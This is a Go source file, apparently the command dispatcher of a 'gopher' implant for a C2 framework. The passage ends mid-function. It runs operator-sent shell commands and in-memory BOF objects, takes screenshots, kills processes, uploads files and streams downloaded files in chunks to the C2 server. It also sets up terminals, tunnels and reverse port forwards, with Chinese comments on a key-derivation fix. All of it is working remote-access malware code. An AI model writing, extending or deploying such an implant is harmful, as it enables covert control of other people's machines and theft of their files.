package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"gopher/bof/coffer"
	"gopher/functions"
	"gopher/utils"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var UPLOADS map[string][]byte
var DOWNLOADS map[string]utils.Connection
var JOBS map[string]utils.Connection
var TUNNELS sync.Map
var TERMINALS sync.Map

type TunnelController struct {
	Cancel context.CancelFunc
	Paused atomic.Bool
}

// ─────────────────── D2：方向密钥派生（消除 two-time pad）───────────────────
//
// 缺陷：enc 与 dec 原先共用同一对 (key, iv) ⇒ AES-CTR 两个方向产生**同一段密钥流**：
//
//	C(server→agent) ⊕ C(agent→server) = P(server→agent) ⊕ P(agent→server)
//
// 即 two-time pad。终端会话里 s→a 是操作员键入、a→s 是 shell 回显，两者异或直接还原；
// 而 shell 提示符高度可预测 ⇒ 已知一侧明文即可解出另一侧。隧道同理。
//
// 修法：由同一 (key, iv) 用 HMAC-SHA256 作 KDF，派生出**两个计算上无关**的方向密钥。
//   ★ 为什么不是"给其中一个方向换个 iv"：CTR 下同 key、iv 仅差若干比特仍产生**相关**
//     密钥流，已知明文下可恢复；HMAC-SHA256 的输出没有这种结构。
//   ★ 为什么不动线格式：(key, iv) 仍原样走 initMsg ⇒ 协商格式零变化，两端各自本地派生。
//     但**两端必须同批上线** —— 只改一侧，该侧就解不出对侧（现象：隧道/终端一连就乱码）。
//
// ★★ 本函数在**两棵树里各有一份**，必须逐字节等价：
//      listener: extenders/gopher_listener_tcp/pl_transport.go
//      agent   : extenders/gopher_agent/src_gopher/tasks.go
//    标签改一个字、拼接顺序换一下，都会**静默**错位。
//
// ★★ 标签按**线路方向**命名，不按本地变量名 —— 两端的 enc/dec 与方向的对应是**相反**的：
//      server→agent : listener 用 encStream，agent 用 decStream
//      agent→server : listener 用 decStream，agent 用 encStream
//    按方向命名，是为了避开"照本地变量名对齐"这个几乎必然会犯的错。

const (
	axKeyLabelTunS2A  = "axc2/tunnel/s2a/v1"
	axKeyLabelTunA2S  = "axc2/tunnel/a2s/v1"
	axKeyLabelTermS2A = "axc2/terminal/s2a/v1"
	axKeyLabelTermA2S = "axc2/terminal/a2s/v1"
)

func axDirKey(key, iv []byte, label string) []byte {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(label))
	h.Write(iv)
	return h.Sum(nil)
}

func TaskProcess(commands [][]byte) [][]byte {
	var (
		command utils.Command
		data    []byte
		result  [][]byte
		err     error
	)

	for _, cmdBytes := range commands {
		err = msgpack.Unmarshal(cmdBytes, &command)
		if err != nil {
			continue
		}

		switch command.Code {

		case utils.COMMAND_DOWNLOAD:
			data, err = jobDownloadStart(command.Data)

		case utils.COMMAND_CAT:
			data, err = taskCat(command.Data)

		case utils.COMMAND_CD:
			data, err = taskCd(command.Data)

		case utils.COMMAND_CP:
			data, err = taskCp(command.Data)

		case utils.COMMAND_EXEC_BOF:
			data, err = taskExecBof(command.Data)

		case utils.COMMAND_EXEC_BOF_ASYNC:
			data, err = jobExecBofAsync(command.Data)

		case utils.COMMAND_EXIT:
			data, err = taskExit()

		case utils.COMMAND_JOB_LIST:
			data, err = taskJobList()

		case utils.COMMAND_JOB_KILL:
			data, err = taskJobKill(command.Data)

		case utils.COMMAND_KILL:
			data, err = taskKill(command.Data)

		case utils.COMMAND_LS:
			data, err = taskLs(command.Data)

		case utils.COMMAND_MKDIR:
			data, err = taskMkdir(command.Data)

		case utils.COMMAND_MV:
			data, err = taskMv(command.Data)

		case utils.COMMAND_PS:
			data, err = taskPs()

		case utils.COMMAND_PWD:
			data, err = taskPwd()

		case utils.COMMAND_REV2SELF:
			data, err = taskRev2Self()

		case utils.COMMAND_RM:
			data, err = taskRm(command.Data)

		case utils.COMMAND_RUN:
			data, err = jobRun(command.Data)

		case utils.COMMAND_SHELL:
			data, err = taskShell(command.Data)

		case utils.COMMAND_SCREENSHOT:
			data, err = taskScreenshot()

		case utils.COMMAND_TERMINAL_START:
			jobTerminal(command.Data)

		case utils.COMMAND_TERMINAL_STOP:
			taskTerminalKill(command.Data)

		case utils.COMMAND_TUNNEL_START:
			jobTunnel(command.Data)

		case utils.COMMAND_TUNNEL_STOP:
			taskTunnelKill(command.Data)

		case utils.COMMAND_TUNNEL_PAUSE:
			taskTunnelPause(command.Data)

		case utils.COMMAND_TUNNEL_RESUME:
			taskTunnelResume(command.Data)

		case utils.COMMAND_TUNNEL_REVERSE:
			// ★ 批次9：**有返回值**，与上面几个 tunnel 命令不同 ——
			//   它们的结果走 TUNNEL_PACK 通道，而「监听起没起」必须作为**任务回答**回给
			//   teamserver，否则 GUI 永远停在「已创建但未激活」。
			data, err = taskTunnelReverse(command.Data)

		case utils.COMMAND_UPLOAD:
			data, err = taskUpload(command.Data)

		case utils.COMMAND_ZIP:
			data, err = taskZip(command.Data)

		default:
			continue
		}

		if err != nil {
			command.Code = utils.COMMAND_ERROR
			command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
		} else {
			command.Data = data
		}

		packerData, _ := msgpack.Marshal(command)
		result = append(result, packerData)
	}

	return result
}

/// TASKS

func taskCat(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCat
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	fileInfo, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if fileInfo.Size() > 0x100000 {
		return nil, fmt.Errorf("file size exceeds 1 Mb (use download)")
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsCat{Path: params.Path, Content: content})
}

func taskCd(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCd
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	err = os.Chdir(path)
	if err != nil {
		return nil, err
	}

	newPath, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: newPath})
}

func taskCp(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCp
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
	}

	return nil, err
}

func taskExecBof(paramsData []byte) ([]byte, error) {
	var params utils.ParamsExecBof
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
	if err != nil {
		args = make([]byte, 1)
	}

	msgs, err := coffer.Load(params.Object, args)
	if err != nil {
		return nil, err
	}

	list, _ := msgpack.Marshal(msgs)

	return msgpack.Marshal(utils.AnsExecBof{Msgs: list})
}

func taskExit() ([]byte, error) {
	ACTIVE = false
	return nil, nil
}

func taskJobList() ([]byte, error) {

	var jobList []utils.JobInfo
	for k, v := range DOWNLOADS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}
	for k, v := range JOBS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}

	list, _ := msgpack.Marshal(jobList)

	return msgpack.Marshal(utils.AnsJobList{List: list})
}

func taskJobKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsJobKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	job, ok := DOWNLOADS[params.Id]
	if !ok {
		job, ok = JOBS[params.Id]
		if !ok {
			return nil, fmt.Errorf("job '%s' not found", params.Id)
		}
	}

	if job.JobCancel != nil {
		job.JobCancel()
	}

	job.HandleCancel()

	return nil, nil
}

func taskKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	proc, err := os.FindProcess(params.Pid)
	if err != nil {
		return nil, err
	}

	err = proc.Signal(syscall.SIGKILL)
	return nil, err
}

func taskLs(paramsData []byte) ([]byte, error) {
	var params utils.ParamsLs
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	Files, err := functions.GetListing(path)
	if err != nil {
		return msgpack.Marshal(utils.AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
	}

	filesData, _ := msgpack.Marshal(Files)

	return msgpack.Marshal(utils.AnsLs{Result: true, Path: path, Files: filesData})
}

func taskMkdir(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMkdir
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	mode := os.FileMode(0755)
	err = os.MkdirAll(path, mode)

	return nil, err
}

func taskMv(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMv
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	err = os.Rename(srcPath, dstPath)
	if err == nil {
		return nil, nil
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
		if err == nil {
			_ = os.RemoveAll(srcPath)
		}
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
		if err == nil {
			_ = os.Remove(srcPath)
		}
	}
	return nil, err
}

func taskPs() ([]byte, error) {
	Processes, err := functions.GetProcesses()
	if err != nil {
		return nil, err
	}

	processesData, _ := msgpack.Marshal(Processes)

	return msgpack.Marshal(utils.AnsPs{Result: true, Processes: processesData})
}

func taskPwd() ([]byte, error) {
	path, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: path})
}

func taskRev2Self() ([]byte, error) {
	functions.Rev2Self()
	return nil, nil
}

func taskRm(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRm
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	return nil, err
}

func taskScreenshot() ([]byte, error) {
	screenshot, err := functions.Screenshots()
	if err != nil {
		return nil, err
	}

	screens := make([][]byte, 0)
	for _, pic := range screenshot {
		screens = append(screens, pic)
	}

	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
}

func taskShell(paramsData []byte) ([]byte, error) {
	var params utils.ParamsShell
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	output, _ := cmd.CombinedOutput()

	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
}

func taskTerminalKill(paramsData []byte) {
	var params utils.ParamsTerminalStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TERMINALS.Load(params.TermId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskTunnelKill(paramsData []byte) {
	var params utils.ParamsTunnelStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		ctrl, ok := value.(*TunnelController)
		if ok {
			ctrl.Cancel()
		}
	}
}

func taskTunnelPause(paramsData []byte) {
	var params utils.ParamsTunnelPause
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		ctrl, ok := value.(*TunnelController)
		if ok {
			ctrl.Paused.Store(true)
		}
	}
}

func taskTunnelResume(paramsData []byte) {
	var params utils.ParamsTunnelResume
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		ctrl, ok := value.(*TunnelController)
		if ok {
			ctrl.Paused.Store(false)
		}
	}
}

func taskUpload(paramsData []byte) ([]byte, error) {
	var params utils.ParamsUpload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	uploadBytes, ok := UPLOADS[path]
	if !ok {
		uploadBytes = params.Content
	} else {
		delete(UPLOADS, path)
		uploadBytes = append(uploadBytes, params.Content...)
	}

	if params.Finish {
		files, err := functions.UnzipBytes(uploadBytes)
		if err != nil {
			return nil, err
		}

		content, ok := files[params.Path]
		if !ok {
			return nil, errors.New("file not uploaded")
		}

		err = os.WriteFile(path, content, 0644)
		if err != nil {
			return nil, err
		}

	} else {
		UPLOADS[path] = uploadBytes
		return nil, nil
	}

	return msgpack.Marshal(utils.AnsUpload{Path: path})
}

func taskZip(paramsData []byte) ([]byte, error) {
	var params utils.ParamsZip
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(srcPath)
	} else {
		content, err = functions.ZipFile(srcPath)
	}
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(dstPath, content, 0644)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
}

/// JOBS

func jobExecBofAsync(paramsData []byte) ([]byte, error) {

	var params utils.ParamsExecBof
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
	if err != nil {
		args = make([]byte, 1)
	}

	asyncBof, errLoad := coffer.LoadAsync(params.Object, args, SignalWakeup)
	if errLoad != nil {
		return nil, errLoad
	}

	var conn net.Conn
	conn, err = DialProfile(profile, profile.Addresses[0])
	if err != nil {
		return nil, err
	}

	connection := utils.Connection{
		PackType: utils.BOF_PACK,
		JobCancel: func() {
			asyncBof.Stop()
		},
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		bofFinished := false
		defer func() {
			if bofFinished {
				asyncBof.Cleanup()
			}
			connection.HandleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.BOF_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_EXEC_BOF_ASYNC,
			JobId:     params.Task,
		}
		nullMsgs, _ := msgpack.Marshal(make([]utils.BofMsg, 0))
		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Start: true, Msgs: nullMsgs})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}
		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		/////

		var pendingMsgs []utils.BofMsg
		bofMsg := utils.BofMsg{}
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		running := true
		for running {
			select {
			case <-connection.Ctx.Done():
				running = false

			case msg, ok := <-asyncBof.Output:
				if !ok {
					running = false
					break
				}
				switch v := msg.(type) {
				case int:
					bofMsg.Type = v
				case []byte:
					bofMsg.Data = v
					pendingMsgs = append(pendingMsgs, bofMsg)
					bofMsg = utils.BofMsg{}
				default:
					bofMsg = utils.BofMsg{}
				}

			case <-ticker.C:
				if len(pendingMsgs) > 0 {
					packMsgs, _ := msgpack.Marshal(pendingMsgs)
					ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}

					job.Data, _ = msgpack.Marshal(ansBofAsync)
					packedJob, _ := msgpack.Marshal(job)

					message := utils.Message{
						Type:   2,
						Object: [][]byte{packedJob},
					}
					sendData, _ := msgpack.Marshal(message)
					sendData, _ = utils.EncryptData(sendData, utils.SKey)
					functions.SendMsg(conn, sendData)

					pendingMsgs = pendingMsgs[:0]
				}
			}
		}

		select {
		case <-asyncBof.Done:
			bofFinished = true
		case <-connection.Ctx.Done():
			select {
			case <-asyncBof.Done:
				bofFinished = true
			case <-time.After(3 * time.Second):
			}
		}

	drainLoop:
		for {
			select {
			case msg, ok := <-asyncBof.Output:
				if !ok {
					break drainLoop
				}
				switch v := msg.(type) {
				case int:
					bofMsg.Type = v
				case []byte:
					bofMsg.Data = v
					pendingMsgs = append(pendingMsgs, bofMsg)
					bofMsg = utils.BofMsg{}
				default:
					bofMsg = utils.BofMsg{}
				}
			default:
				break drainLoop
			}
		}

		if len(pendingMsgs) > 0 {
			packMsgs, _ := msgpack.Marshal(pendingMsgs)
			ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}

			job.Data, _ = msgpack.Marshal(ansBofAsync)
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}
			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			functions.SendMsg(conn, sendData)
		}

		/// FINISH

		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Finish: true, Msgs: nullMsgs})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

func jobDownloadStart(paramsData []byte) ([]byte, error) {
	var params utils.ParamsDownload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	size := info.Size() // тип int64

	if size > 4*1024*1024*1024 {
		return nil, errors.New("file too big (>4GB)")
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(path)
		path += ".zip"
	} else {
		content, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	conn, err = DialProfile(profile, profile.Addresses[0])
	if err != nil {
		return nil, err
	}

	strFileId := params.Task
	FileId, _ := strconv.ParseInt(strFileId, 16, 64)

	connection := utils.Connection{
		PackType: utils.EXFIL_PACK,
		Conn:     conn,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	DOWNLOADS[strFileId] = connection

	go func() {
		defer func() {
			connection.HandleCancel()
			_ = conn.Close()
			delete(DOWNLOADS, strFileId)
		}()

		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)

		job := utils.Job{
			CommandId: utils.COMMAND_DOWNLOAD,
			JobId:     params.Task,
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, exfilMsg)

		chunkSize := 0x100000 // 1MB
		totalSize := len(content)
		for i := 0; i < totalSize; i += chunkSize {

			end := i + chunkSize
			if end > totalSize {
				end = totalSize
			}
			start := i == 0
			finish := end == totalSize

			canceled := false

			select {
			case <-connection.Ctx.Done():
				finish = true
				canceled = true
			default:
				// Continue
			}

			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}

			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			_ = functions.SendMsg(conn, sendData)

			if finish {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()

	return nil, nil
}

func jobRun(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRun
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	procCtx, procCancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stdout pipe error: %w", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stderr pipe error: %w", err)
	}

	var stdoutMu sync.Mutex
	var stderrMu sync.Mutex
	stdoutBuf := new(bytes.Buffer)
	stderrBuf := new(bytes.Buffer)

	err = cmd.Start()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("start error: %w", err)
	}
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	var conn net.Conn
	conn, err = DialProfile(profile, profile.Addresses[0])
	if err != nil {
		procCancel()
		return nil, err
	}

	connection := utils.Connection{
		PackType:  utils.JOB_PACK,
		Conn:      conn,
		JobCancel: procCancel,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		defer func() {
			procCancel()
			connection.HandleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_RUN,
			JobId:     params.Task,
		}

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Start: true})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stdoutPipe.Read(buf)
				if n > 0 {
					stdoutMu.Lock()
					stdoutBuf.Write(buf[:n])
					stdoutMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()
		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stderrPipe.Read(buf)
				if n > 0 {
					stderrMu.Lock()
					stderrBuf.Write(buf[:n])
					stderrMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()

		done := make(chan struct{})
		var lastOutLen, lastErrLen int
		const maxChunkSize = 0x10000 // 65 Kb
		go func() {
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return

				case <-ticker.C:
					ansRun := utils.AnsRun{Pid: pid}
					stdoutMu.Lock()
					out := stdoutBuf.String()
					stdoutMu.Unlock()
					if len(out) > lastOutLen {
						chunk := out[lastOutLen:]
						if len(chunk) > maxChunkSize {
							ansRun.Stdout = chunk[:maxChunkSize]
							lastOutLen += maxChunkSize
						} else {
							ansRun.Stdout = chunk
							lastOutLen = len(out)
						}
					}

					stderrMu.Lock()
					errOut := stderrBuf.String()
					stderrMu.Unlock()
					if len(errOut) > lastErrLen {
						chunk := errOut[lastErrLen:]
						if len(chunk) > maxChunkSize {
							ansRun.Stderr = chunk[:maxChunkSize]
							lastErrLen += maxChunkSize
						} else {
							ansRun.Stderr = chunk
							lastErrLen = len(errOut)
						}
					}

					if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)

						message := utils.Message{
							Type:   2,
							Object: [][]byte{packedJob},
						}

						sendData, _ := msgpack.Marshal(message)
						sendData, _ = utils.EncryptData(sendData, utils.SKey)
						functions.SendMsg(conn, sendData)
					}
				}
			}
		}()

		time.Sleep(200 * time.Millisecond)
		err = cmd.Wait()
		wg.Wait()
		close(done)

		stdoutMu.Lock()
		finalOut := stdoutBuf.String()
		stdoutMu.Unlock()
		stderrMu.Lock()
		finalErrOut := stderrBuf.String()
		stderrMu.Unlock()

		for {
			ansRun := utils.AnsRun{Pid: pid}
			hasMore := false

			if len(finalOut) > lastOutLen {
				chunk := finalOut[lastOutLen:]
				if len(chunk) > maxChunkSize {
					ansRun.Stdout = chunk[:maxChunkSize]
					lastOutLen += maxChunkSize
					hasMore = true
				} else {
					ansRun.Stdout = chunk
					lastOutLen = len(finalOut)
				}
			}

			if len(finalErrOut) > lastErrLen {
				chunk := finalErrOut[lastErrLen:]
				if len(chunk) > maxChunkSize {
					ansRun.Stderr = chunk[:maxChunkSize]
					lastErrLen += maxChunkSize
					hasMore = true
				} else {
					ansRun.Stderr = chunk
					lastErrLen = len(finalErrOut)
				}
			}

			if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
				job.Data, _ = msgpack.Marshal(ansRun)
				packedJob, _ = msgpack.Marshal(job)
				message = utils.Message{
					Type:   2,
					Object: [][]byte{packedJob},
				}
				sendData, _ = msgpack.Marshal(message)
				sendData, _ = utils.EncryptData(sendData, utils.SKey)
				functions.SendMsg(conn, sendData)

				if hasMore {
					time.Sleep(100 * time.Millisecond)
				}
			}

			if !hasMore {
				break
			}
		}

		/// FINISH

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

// pivotDialTimeout 是 pivot（隧道）拨向**目标**的超时。
//
// ★ 改造前这里是硬编码的 `200 * time.Millisecond`（Phase5 §4 步骤 5）。那个值
// 短到会让下面的原因码**说谎**：对端回 ECONNREFUSED 的 RTT 常常 >200ms ⇒ 本地先超时
// ⇒ 上报 reason=4(timeout) 而不是 5(ECONNREFUSED)。改成 3s 后，原因码才反映真实原因。
const pivotDialTimeout = 3 * time.Second

// ── 批次9：反向端口转发（rportfwd）─────────────────────────────────────────

// axPreconns 暂存「已经 accept、等着经 C2 通道回连 teamserver」的连接。
// ★ 用 map 而不是给 jobTunnel 加参数：jobTunnel 的调用点（dispatch）不改，
// 正向路径的唯一改动就是 dial 后多一次查表。
var axPreconns sync.Map

func axPutPreconn(channelId int, c net.Conn) { axPreconns.Store(channelId, c) }

func axTakePreconn(channelId int) (net.Conn, bool) {
	v, ok := axPreconns.LoadAndDelete(channelId)
	if !ok {
		return nil, false
	}
	c, ok := v.(net.Conn)
	return c, ok
}

// ── axRpfLns：本 agent 自己建立的 rportfwd 监听（port → net.Listener）────────────
// ★ 为什么需要这张表：隧道 stop 时 core **无法通知 agent** 关监听 ——
//   ① axc2 的 adaptix.TunnelCallbacks 里没有「关监听」这个成员（只有 Close(channelId)）；
//   ② TsTunnelStop 只关服务端的 tunnel.listener，反向的监听在 agent 上，对 REVERSE 是空操作；
//   ③ 上游留的 TsTunnelStopRportfwd 全树零调用者，且把 TunnelId 当 channelId 传（实参语义错）。
//   ⇒ 旧 listener 会一直占着端口。有了这张表就能：
//     ① 补全 core 的 enable/stop 生命周期：同端口再启用时**只关自己建的**那个旧 listener，
//        让 `TsTunnelCreate` 的 reuse 分支（"keep id for enable/stop lifecycle"）真正可用；
//     ② 绝不去关别人的监听 —— 外来占用者照旧走 Result:0 的失败路径。
// ★ 用 Mutex + map 而不是 sync.Map：删除必须「按身份条件删」（只删还是自己的那条），
//   sync.Map 在不依赖 CompareAndDelete（Go 版本相关）的前提下表达不了这个语义。
// ★ 注意上面这行与 `var (` 之间的**空行是必需的**：Go 1.19+ 的 gofmt 会把「紧贴声明的
//   注释块」当 doc comment 重排（把 `//   xxx` 改成 `//	xxx`）⇒ 判据 X7 会红。
//   空行让注释与声明脱钩，gofmt 就不动它（这是本批次实测出来的，见归档坑位）。

var (
	axRpfLns   = make(map[int]net.Listener)
	axRpfLnsMu sync.Mutex
)

func axPutRpfListener(port int, ln net.Listener) {
	axRpfLnsMu.Lock()
	old := axRpfLns[port]
	axRpfLns[port] = ln
